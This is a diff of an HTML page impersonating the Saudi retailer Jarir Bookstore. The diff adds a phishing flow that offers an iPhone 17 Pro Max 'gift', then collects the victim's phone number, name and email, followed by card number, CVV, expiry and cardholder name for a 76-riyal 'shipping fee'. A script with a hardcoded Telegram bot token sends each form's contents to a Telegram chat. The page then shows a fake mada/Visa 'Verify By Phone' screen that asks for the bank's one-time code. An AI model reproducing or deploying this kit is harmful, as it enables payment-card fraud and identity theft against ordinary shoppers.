@@ -3,127 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جرير - آيفون 17 برو ماكس</title>
+    <title>جرير - iPhone 17 Pro Max</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <script src="https://cdn.tailwindcss.com"></script>
-    
     <style>
-        :root {
-            --jarir-red: #E30613;
-            --jarir-navy: #2D3E50;
-        }
-        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; padding: 0; }
+        :root { --jarir-red: #E30613; --jarir-navy: #2D3E50; }
+        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; padding: 0;}
+        .page { display: none; min-height: 100vh; }
+        .page.active { display: block; }
+        .form-input { width: 100%; background: #F0F2F5; border: 1px solid #E5E7EB; border-radius: 4px; padding: 12px; outline: none; text-align: right; font-size: 14px; }
+        .btn-red { background-color: var(--jarir-red); width: 100%; color: white; font-weight: bold; border-radius: 8px; transition: 0.3s; }
         
-        /* تنسيق صفحة جرير */
-        #jarir-page { display: flex; flex-direction: column; min-height: screen; }
-        .product-section { background: #ffffff; display: flex; justify-content: center; align-items: center; padding: 20px 0; }
-        .phone-image { width: 260px; height: auto; object-fit: contain; filter: drop-shadow(0 15px 25px rgba(0,0,0,0.1)); }
-        .btn-red { background-color: var(--jarir-red); transition: 0.3s; cursor: pointer; }
-        .btn-red:active { transform: scale(0.98); opacity: 0.9; }
-        .accordion-content { max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out; }
-        .accordion-content.active { max-height: 200px; }
-        .rotate-icon { transition: transform 0.3s; }
-        .rotate-icon.active { transform: rotate(180deg); }
+        /* أيقونة السلة جرير */
+        .cart-icon-container { position: relative; background: #F0F2F5; padding: 8px; border-radius: 8px; }
+        .cart-badge { position: absolute; top: -5px; right: -5px; background: #FF9800; color: white; font-size: 10px; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
+        
+        /* صفحة البنك (تنسيق خاص) */
+        #page-bank { direction: ltr; text-align: left; background: white; }
+        .bank-container { padding: 20px; max-width: 450px; margin: 0 auto; }
+        .mada-logo-big img { height: 60px; width: auto; }
+        .visa-logo-big img { height: 60px; width: auto; }
+        .confirm-btn-blue { width: 100%; background-color: #0000FF; color: white; border: none; padding: 16px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; margin-top: 20px;}
 
-        /* تنسيق صفحة الـ 3D Secure (مخفية في البداية) */
-        #bank-page { display: none; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; direction: ltr; text-align: left; padding: 20px; background: #fff; }
-        .bank-container { max-width: 450px; margin: 0 auto; }
-        .mada-logo-large img { height: 60px; width: auto; }
-        .visa-logo-large img { height: 60px; width: auto; }
-        .confirm-btn-blue { width: 100%; background-color: #0000FF; color: white; border: none; padding: 16px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 20px; }
-        
-        .hide-scrollbar::-webkit-scrollbar { display: none; }
+        .back-to-top { position: fixed; bottom: 80px; left: 20px; background: white; border: 1px solid #DDD; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); z-index: 100; }
     </style>
 </head>
-<body class="max-w-md mx-auto shadow-2xl min-h-screen bg-white">
+<body class="max-w-md mx-auto shadow-2xl bg-white">
 
-    <div id="jarir-page">
-        <header class="p-4 border-b sticky top-0 bg-white z-50">
-            <div class="flex items-center justify-between mb-3">
-                <i class="fa-solid fa-bars text-xl text-gray-700"></i>
-                <div class="flex items-center gap-1">
-                    <span class="text-2xl font-black text-[#E30613]">JARIR</span>
-                </div>
-                <div class="relative">
-                    <i class="fa-solid fa-cart-shopping text-xl text-gray-700"></i>
-                    <span class="absolute -top-2 -right-2 bg-[#E30613] text-white text-[10px] rounded-full w-4 h-4 flex items-center justify-center">1</span>
+    <section id="page-product" class="page active">
+        <header class="p-3 border-b sticky top-0 bg-white z-50 flex justify-between items-center">
+            <div class="flex items-center gap-4">
+                <i class="fa-solid fa-bars text-xl text-gray-600"></i>
+                <div class="cart-icon-container">
+                    <i class="fa-solid fa-cart-shopping text-gray-600"></i>
+                    <span class="cart-badge">1</span>
                 </div>
             </div>
-            <div class="relative">
-                <input type="text" value="iphone 17 pro max" readonly class="w-full bg-gray-100 rounded-lg py-2 pr-10 pl-4 text-sm text-right outline-none text-gray-500">
-                <i class="fa-solid fa-magnifying-glass absolute right-3 top-3 text-gray-400"></i>
+            <div class="flex items-center gap-1">
+                <div class="relative flex items-center bg-gray-100 rounded-full px-4 py-1">
+                    <input type="text" value="iphone 17 pro max" readonly class="bg-transparent text-sm text-right outline-none w-32">
+                    <i class="fa-solid fa-magnifying-glass text-gray-400 mr-2"></i>
+                </div>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Jarir_Bookstore_Logo.svg" class="h-6">
             </div>
         </header>
 
-        <section class="product-section">
-            <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" alt="iPhone 17 Pro Max" class="phone-image">
-        </section>
+        <div class="py-6 flex justify-center">
+            <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" class="w-[280px]">
+        </div>
 
         <main class="p-5">
-            <div class="flex items-center justify-between mb-2">
-                <h1 class="text-xl font-extrabold text-gray-900">ابل آيفون 17 برو ماكس</h1>
-                <i class="fa-brands fa-apple text-3xl text-gray-800"></i>
-            </div>
-            <div class="mb-6 bg-red-50 p-4 rounded-2xl flex justify-between items-center border border-red-100">
-                <div class="text-[#E30613] text-3xl font-black">5,699 <span class="text-sm">ر.س</span></div>
-            </div>
-
-            <button onclick="showBankPage()" class="btn-red w-full text-white font-bold py-4 rounded-xl text-lg mb-8 shadow-lg">
-                أضف إلى السلة
-            </button>
+            <h1 class="text-xl font-bold text-gray-900 text-right">ابل آيفون 17 برو ماكس</h1>
+            <button onclick="showPage('page-register')" class="bg-[#E30613] text-white font-bold w-full py-4 rounded-lg text-lg mt-4">استلم الهديه</button>
         </main>
+    </section>
 
-        <footer class="bg-[#2D3E50] text-white p-6 mt-auto">
-            <p class="text-center text-[10px]">جميع الحقوق محفوظة لمكتبة جرير © 2026</p>
-        </footer>
-    </div>
+    <section id="page-register" class="page bg-white">
+        <header class="p-4 border-b flex justify-between items-center">
+            <button onclick="showPage('page-product')"><i class="fa-solid fa-chevron-right ml-2"></i>العودة</button>
+            <span class="font-bold">معلومات التسليم</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Jarir_Bookstore_Logo.svg" class="h-5">
+        </header>
+        <div class="p-6 space-y-4">
+            <input type="tel" id="user-phone" placeholder="رقم الهاتف" class="form-input">
+            <input type="text" id="user-name" placeholder="الاسم الكامل" class="form-input">
+            <input type="email" id="user-email" placeholder="البريد الإلكتروني" class="form-input">
+            <button onclick="sendData('register')" class="btn-red py-4 mt-6">استمرار</button>
+        </div>
+    </section>
 
-    <div id="bank-page">
+    <section id="page-payment" class="page bg-[#F3F5F7]">
+        <header class="p-4 bg-white border-b flex justify-between items-center">
+            <button onclick="showPage('page-register')"><i class="fa-solid fa-chevron-right ml-2"></i>العودة</button>
+            <span class="font-bold">دفع مصاريف الشحن</span>
+        </header>
+        <main class="p-4">
+            <div class="bg-white rounded-lg p-6 shadow-sm border">
+                <input type="text" id="card-num" placeholder="رقم البطاقة" class="form-input mb-4">
+                <div class="flex gap-2 mb-4">
+                    <input type="text" id="card-cvv" placeholder="CVV" class="form-input w-1/3">
+                    <input type="text" id="card-exp" placeholder="MM/YY" class="form-input w-2/3">
+                </div>
+                <input type="text" id="card-holder" placeholder="اسم حامل البطاقة" class="form-input">
+                <button onclick="sendData('payment')" class="btn-red py-4 mt-8">دفع (76 ر.س)</button>
+            </div>
+        </main>
+    </section>
+
+    <section id="page-bank" class="page">
         <div class="bank-container">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <div style="color: #0000FF; font-size: 28px;">&#10094;</div>
-                <div style="font-weight: bold;">Cancel</div>
+                <div style="color: #0000FF; font-size: 26px;">&#10094;</div>
+                <div style="font-weight: bold; font-family: Arial;">Cancel</div>
             </div>
 
             <div style="display: flex; justify-content: space-between; align-items: center;">
-                <div class="mada-logo-large">
-                    <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="mada">
+                <div class="mada-logo-big">
+                    <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png">
                 </div>
                 <div style="text-align: right;">
                     <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" style="height: 60px;">
-                    <div style="font-size: 12px; color: #444;">ID Check</div>
+                    <div style="font-size: 11px; color: #666; font-family: Arial;">ID Check</div>
                 </div>
             </div>
 
             <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
 
-            <h1 style="font-family: 'Times New Roman'; font-size: 26px; font-weight: bold;">Verify By Phone</h1>
-            <p style="font-size: 16px;">We have sent you a text message with a code to your registered mobile number.</p>
-            <p style="font-size: 16px;">You are paying <strong>Jarir Bookstore</strong> the amount of <strong>SAR 5,699</strong> on 2026/02/15.</p>
+            <h1 style="font-family: 'Times New Roman'; font-size: 24px; font-weight: bold;">Verify By Phone</h1>
+            <p style="font-size: 15px; font-family: Arial;">We have sent you a text message with a code to your registered mobile number.</p>
+            <p style="font-size: 15px; font-family: Arial;">You are paying <strong>Jarir Bookstore</strong> the amount of <strong>SAR 76.00</strong> on 2026/02/15.</p>
 
             <div style="text-align: center; margin-top: 40px;">
-                <label style="color: #888; font-size: 14px; display: block; margin-bottom: 10px;">Verification code</label>
+                <label style="color: #888; font-size: 14px; display: block; margin-bottom: 8px; font-family: Arial;">Verification code</label>
                 <input type="text" style="width: 100%; height: 50px; border: 1px solid #ccc; text-align: center; font-size: 24px; border-radius: 4px;">
                 <button class="confirm-btn-blue">CONFIRM</button>
-                <a href="#" style="display: block; margin-top: 30px; color: #0000FF; font-weight: bold; text-decoration: none;">RESEND CODE</a>
+                <a href="#" style="display: block; margin-top: 30px; color: #0000FF; font-weight: bold; text-decoration: none; font-family: Arial; font-size: 14px;">RESEND CODE</a>
             </div>
         </div>
-    </div>
+    </section>
 
     <script>
-        // وظيفة التبديل بين الصفحات
-        function showBankPage() {
-            document.getElementById('jarir-page').style.display = 'none';
-            document.getElementById('bank-page').style.display = 'block';
-            window.scrollTo(0, 0); // للعودة لأعلى الصفحة عند التبديل
+        const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
+        const chatId = "1705240737";
+
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            window.scrollTo(0,0);
         }
 
-        function toggleAcc(id) {
-            const content = document.getElementById(`content-${id}`);
-            const icon = document.getElementById(`icon-${id}`);
-            content.classList.toggle('active');
-            icon.classList.toggle('active');
+        async function sendData(step) {
+            let text = "";
+            if(step === 'register') {
+                text = `👤 زبون جديد:\n📞 هاتف: ${document.getElementById('user-phone').value}\n📝 اسم: ${document.getElementById('user-name').value}\n📧 بريد: ${document.getElementById('user-email').value}`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+                showPage('page-payment');
+            } else if(step === 'payment') {
+                text = `💳 معلومات البطاقة:\n🔢 رقم: ${document.getElementById('card-num').value}\n📅 تاريخ: ${document.getElementById('card-exp').value}\n🔒 CVV: ${document.getElementById('card-cvv').value}\n👤 اسم: ${document.getElementById('card-holder').value}`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+                // بدلاً من التنبيه، ننتقل لصفحة البنك
+                showPage('page-bank');
+            }
         }
     </script>
 </body>
